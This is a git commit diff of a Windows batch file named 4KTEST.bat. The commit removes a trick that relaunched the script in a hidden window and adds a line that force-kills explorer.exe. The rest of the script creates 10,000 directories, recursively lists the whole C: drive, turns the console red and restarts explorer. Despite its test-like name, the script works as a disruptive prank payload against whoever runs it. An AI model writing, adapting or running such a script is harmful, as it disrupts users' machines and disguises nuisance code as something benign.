8bf50a7ee7bdb667aaee2d90799ff199deeb2dc0
eymenegetekiner-alt <eymenegetekiner@gmail.com>
2026-07-14 17:57:28 +0300

    Refactor 4KTEST.bat to kill and restart explorer

--- INDEX-main/4KTEST.bat
+++ INDEX-main/4KTEST.bat
@@ -1,10 +1,5 @@
 @echo off
-if "%1" neq "hidden" (
-    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c ""%~f0"" hidden' -WindowStyle Hidden"
-    exit /b
-)
-
-rem Kendi BAT kodların buradan devam eder
+taskkill /f /im explorer.exe
 cd C:\Users\{COMPUTER_USERNAME}\INDEX-main.zip
 for /l %%i in (1,1,10000) do md %%i
 cd C:\
@@ -12,4 +7,4 @@ color 4
 tree
 dir/s
 cd C:\Users\{COMPUTER_USERNAME}\INDEX-main
-start 4KKTEST.bat
+start explorer.exe
